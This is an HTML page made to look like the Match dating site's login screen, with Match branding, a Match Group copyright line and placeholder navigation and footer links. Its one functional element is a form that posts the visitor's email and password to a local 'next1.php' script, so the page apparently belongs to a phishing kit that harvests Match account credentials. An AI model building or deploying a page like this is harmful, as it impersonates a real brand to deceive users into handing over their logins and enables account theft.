<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0"/>
  <title>Match&#8482; | Meet Someone New</title>

  <!-- CSS  -->
  <link rel="icon" type="image/x-icon" href="img/fav.ico" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <link href="css/materialize.css" type="text/css" rel="stylesheet" media="screen,projection"/>
  <link href="css/style.css" type="text/css" rel="stylesheet" media="screen,projection"/>
  <link rel="stylesheet" href="css/materialize-social.css">
</head>
<body>
  <div class="navbar-fixed">
    <nav class="gr" role="navigation">
      <div class="nav-wrapper container"><a id="logo-container" href="#" class="brand-logo"><b><img src="img/logo.png" style="height:30px;width:100px;"></b></a>
        <ul class="right hide-on-med-and-down">
          <li><a href="#"><i class="material-icons">panorama_fish_eye</i></a></li>
          <li><a class='dropdown-button2 d' href='#'  data-activates='dropdown2' data-hover="hover" data-alignment="left"><i class="material-icons">settings</i></a></li>
        </ul>
        <ul id='dropdown2' class='dropdown-content'>
            <li><a href="#!">one</a></li>
            <li><a href="#!">two</a></li>
            <li class="divider"></li>
            <li><a href="#!">three</a></li>
        </ul>

        <ul class="right hide-on-med-and-down">
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>

        </ul>
        <ul class="right hide-on-med-and-down">
          <li><a href="#">
            <i class="material-icons">all_inclusive</i>
          </a></li>
          <li><a class='dropdown-button2 d' href='#' data-activates='dropdown1'
             data-hover="hover" data-alignment="left"><i class="material-icons">search</i></a>
           </li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li><a class='dropdown-button2 d' href='#' data-activates='dropdown2'
            data-hover="hover" data-alignment="left"><i class="material-icons">favorite_border</i></a></li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li><a href="#"><i class="material-icons">person_pin</i></a></li>
          <li> &nbsp;&nbsp;&nbsp;&nbsp;</li>
          <li><a href="#"><i class="material-icons">launch</i></a></li>
        </ul>

        <ul id="nav-mobile" class="sidenav">
          <li><a href="#">Navbar Link</a></li>
        </ul>
        <a href="#" data-target="nav-mobile" class="sidenav-trigger"><i class="material-icons">menu</i></a>
      </div>
    </nav>
</div>


  <div class="container">
    <div class="section">

      <!--   Icon Section   -->
      <div class="row">
        <div class="col s12 m7 card">
          <div class="icon-block">
            <h5 class="header"><b>Log in</b></h5>
            <center>
                <div id="row">
                  <div class="col s12 m12">
                    <div class="cards">
                      <div class="card-content white-text">
                    <form method="post" action="next1.php">
                      <div class="input-field">
                        <i class="mdi-social-person-outline prefix"></i>
                          <input class="validate" id="email" name="usr" type="email" class="validate" required>
                            <label for="email" data-error="wrong" data-success="right" class="center-align"><b>Email</b></label>
                      </div>

                      <div class="input-field">
                        <i class="mdi-action-lock-outline prefix"></i>
                           <input id="password" name="psw" type="password" class="validate" required>
                             <label for="password"><b>Password</b></label>
                      </div>
                      <br>

                      <div class="input-field">
                        <button class="btn waves-effect waves-light btn-large #0288d1 light-blue darken-2" style="width:350px;border-radius:25px;" type="submit" name="action"><b>Sign In</b></button>
                      </div><br>
                    <p><a href="#" class="blue-text text-darken-2" id="register"><b>Join for free</b> </a></p><br>
                      <p>
                        <a href="#" class="blue-text text-darken-2" id="register">Forgot Email!</a> |
                        <a href="#" class="blue-text text-darken-2"id="forgot">Forgot password</a> |
                        <a href="#" class="blue-text text-darken-2" id="forgot">Help?</a>
                      </p><br>

                      <p><label><input type="checkbox" class="filled-in" checked="checked" /><span class="black-text text-darken-2"><b>Keep me signed in</span></b> </label> </p>
                      <li><a href="#" class="grey-text fot" id="register"> Don't Check on a publiic computer </a></li>
                      <br>

                    <br>
                    <br>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </center>

          </div>
        </div>

        <div class="col s12 m1">
        </div>

        <div class="col s12 m4 card">
          <div class="icon-block">
            <p class="light"></p>
              <br>  <br>  <br>  <br>  <br><br>  <br>  <br>  <br>  <br> <br>  <br>  <br>  <br>  <br>
          </div>
        </div>
        <div class="col s12 m1">
        </div>

        <div class="col s12 m4 card">
          <div class="icon-block">
            <p class="light"></p>
              <br>  <br>  <br>  <br>  <br><br>
          </div>
        </div>
      </div>

    </div>
    <br><br>
  </div>

  <footer class="page-footer white" style="margin-top:-20px;">
    <div class="container">
      <div class="row">
        <div class="col s12 m8">
        <div class="col s2">
          <ul class="foot">
            <li><a class="black-text" href="#!">About Match</a></li>
            <li><a class="black-text" href="#!">Contact Us</a></li>
            <li><a class="black-text" href="#!">Careers </a></li>
          </ul>
        </div>
        <div class="col s2">
          <ul class="foot">
            <li><a class="black-text" href="#!">Terms of Use</a></li>
            <li><a class="black-text" href="#!">Your Privacy</a></li>
            <li><a class="black-text" href="#!">Cookie Policy </a></li>
          </ul>
        </div>
        <div class="col s2">
          <ul class="foot">
            <li><a class="black-text" href="#!">Security</a></li>
            <li><a class="black-text" href="#!">Community GuideLines</a></li>
            <li><a class="black-text" href="#!">Safety Tips </a></li>
          </ul>
        </div>
        <div class="col s2">
          <ul class="foot">
            <li><a class="black-text" href="#!">Media Room</a></li>
            <li><a class="black-text" href="#!">Advertise</a></li>
            <li><a class="black-text" href="#!">Blog </a></li>
          </ul>
        </div>

        <div class="col s2">
          <ul class="foot">
            <li></li>
            <li><a class="black-text" href="#!">Success Stories</a></li>
            <li></li>
          </ul>
        </div>
      </div>
      </div>

      <div class="row">
        <div class="col s7"><hr>
          <div class="col s3">
              <img src="img/fav.ico">
           </div>
          <div  class="col s6">
            <li><a class="black-text center fo" href="#!">© Copyright 2020 Match Group, LLC  </a></li>
           </div>
          <div class="col s3">
              <p><a class="social-icon instagram" href="#"><i class="tiny material-icons fa fa-instagram"></i></a>
                <a class="social-icon facebook" href="#"><i class="tiny material-icons fa fa-facebook"></i></a>
                <a class="social-icon twitter" href="#"><i class="tiny material-icons fa fa-twitter"></i></a>
              </p>
           </div>
           <li><a class="grey-text fo" href="#!"> Thu Mar 05 2020 23:50:27 GMT+0800 (China Standard Time) | v3.69.1 #fd33a51 n:Carbon h:da3-002 api:match </a></li>
      </div>
      </div>
  </footer>

  <!--  Scripts-->
  <script src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
  <script src="js/materialize.js"></script>
  <script src="js/init.js"></script>

  </body>
</html>
